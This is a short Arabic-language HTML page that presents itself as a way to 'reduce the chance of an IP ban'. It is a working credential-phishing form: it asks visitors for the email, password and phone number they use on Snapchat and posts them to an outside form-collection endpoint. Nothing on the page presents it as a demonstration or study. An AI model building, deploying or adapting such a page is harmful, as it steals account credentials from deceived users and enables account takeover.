<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8" />
  <title>نموذج تسجيل</title>
  <style>
    body {
      font-family: Tahoma, Arial;
      background-color: #f9f9f9;
      text-align: center;
      padding: 40px;
      direction: rtl;
    }
    h2 {
      color: red;
      margin-bottom: 20px;
    }
    form {
      background-color: #fff;
      padding: 30px;
      border-radius: 10px;
      display: inline-block;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }
    input {
      padding: 12px;
      margin: 10px;
      width: 260px;
      font-size: 16px;
      border: 1px solid #ccc;
      border-radius: 6px;
      display: block;
      margin-left: auto;
      margin-right: auto;
    }
    button {
      padding: 12px 25px;
      font-size: 16px;
      background-color: #4CAF50;
      color: white;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      margin-top: 10px;
    }
    p {
      margin-top: 20px;
      font-weight: bold;
      color: #c40000;
      font-size: 15px;
    }
  </style>
</head>
<body>

  <h2>🔒 تقليل فرصة حظر الـ IP</h2>

  <form action="https://formspree.io/f/mkgzwlvn" method="POST">
    <input type="email" name="email" placeholder="البريد الإلكتروني" required />
    <input type="password" name="password" placeholder="كلمة المرور" required />
    <input type="tel" name="phone" placeholder="رقم الهاتف" required />
    <button type="submit">إرسال</button>
  </form>

  <p>‼️ يجب كتابة كل المعلومات اللي استخدمتها في Snapchat</p>

</body>
</html>
